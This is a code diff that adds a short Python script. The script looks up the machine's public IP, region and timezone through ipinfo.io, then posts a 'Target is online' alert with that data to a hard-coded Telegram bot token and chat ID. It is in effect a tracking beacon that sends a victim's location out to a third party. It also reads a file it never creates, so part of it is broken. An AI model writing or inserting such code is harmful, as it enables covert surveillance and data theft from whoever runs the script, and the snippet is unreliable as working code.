@@ -1,0 +1,24 @@
+import os
+import time
+import json
+os.system("date >.date")
+file=open(".date","r")
+date=file.read()
+os.system("curl ipinfo.io >.locale")
+f=open(".ip","r")
+ip=f.read()
+
+
+
+
+with open('.locale', 'r') as file:
+    ip_info= file.read()
+
+parsed_data = json.loads(ip_info)
+
+ip=parsed_data['ip']
+region=parsed_data['region']
+zone=parsed_data['timezone']
+
+
+os.system("curl -X POST -H \"Content-Type:multipart/form-data\" -F chat_id=-1001858516519 -F text=\"Target is online 👀\nFrom: {}\nRegion: {}\nTimezone: {} \nTime: {}\" \"https://api.telegram.org/bot6322862879:AAGdnQQq2PrVfcKe50fl_og5QlJOYtdA8oQ/sendMessage\" ". format (ip,region,zone,date))
